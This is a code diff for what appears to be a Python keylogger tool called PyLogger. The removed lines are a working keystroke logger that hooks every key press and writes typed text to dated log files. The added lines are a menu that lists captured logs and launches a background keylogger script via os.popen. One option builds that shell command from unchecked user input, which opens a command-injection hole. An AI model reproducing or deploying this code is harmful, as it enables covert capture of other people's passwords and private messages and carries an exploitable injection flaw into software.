@@ -1,33 +1,62 @@
-#|-----------------------------|
-import keyboard as k
-from datetime import date
 import os
-from random import randint
-#|-----------------------------|
+import time
+import signal
 
-#create a filename with the date as the name and the extension on .txt
-filename = f"keylog_{date.today()}.txt"
-#if the file already exists, add a random number to the name
-if os.path.exists(filename):
-    filename = f"keylog_{date.today()}_{randint(0,999)}.txt"
-#function to write the key pressed to the file
-def on_key_press(event):
-    with open(filename, 'a') as f:
-        #check the lenght of the event name
-        letter = len(event.name)
-        #check if the event is a letter
-        if letter == 1:
-             #if it is a letter than it will write on the file
-             f.write('{}'.format(event.name))
-        #if it's bigger then 1, than is not a letter, it is other tipe of keyboard entry (like: 'enter','backspace','tab' etc...)
-        elif event.name == 'space': #if it is the event 'space' than add a space to the file
-            f.write(' ')
-        elif event.name == 'enter': #if it is the event 'enter' than add a new line to the file
-            f.write('\n')
-        else: #if it is not a letter nor any type like the above, just ignore
-            pass
-k.on_press(on_key_press) #run the function on a key press event
-k.wait() #wait for the key press event
-
-#|-----------------------------------------------------------|
-#author: ConfettiOnTheWall
+while True:
+    print("""
+    ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
+    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
+    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
+    ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░▒▓█▓▒▒▓███▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░  
+    ░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
+    ░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
+    ░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+                                                                                                            
+                                                                                                            
+    """)
+    print("[1] List last Keylogs.txt")
+    print("[2] Activate Keylogger")
+    print("[3] DELETE ALL LOGS")
+    opt = int(input("Choose a option for your PyLogger: \n"))
+    
+    match opt:
+        case 1:
+            print("[1] List last Keylogs.txt [selected]")
+            if os.path.exists("logs"):
+                print("----------------------")
+                print("")
+                for file in os.listdir("logs"):
+                    if file.endswith('.txt'):
+                        print(file)
+            else:
+                print("ERROR: File NOT found")
+            print("")
+            print("----------------------")
+            opt = str(input("[0] restart program \n[enter] close program\n>> "))
+            if opt == "":
+                break
+            
+        case 2:
+            print("[2] Activate Keylogger [selected]")
+            print("")
+            pathK = int(input("Path of the Keylogger \n[1] Use common path\n[2] Inform the path where the keylogger is located\n>>> "))
+            match pathK:
+                case 1:
+                    print("")
+                    print("Using normal path")
+                    print("USE CTRL + C to kill the keylogger")
+                    os.popen("python clientbuild.py")
+                case 2:
+                    print("")
+                    print("Please insert the path: ")
+                    pathV = str(input("Paste here -> "))
+                    Crun = "python " + pathV + "/clientbuild.py"
+                    os.popen(Crun)
+                    input("Use CTRL + C to kill keylogger")
+                    
+        case 3:
+            print("[3] DELETE ALL LOGS [selected]")
+        case _:
+            print("!! Sorry this is not a Option !!")
+            time.sleep(2)
+            os.system('cls')
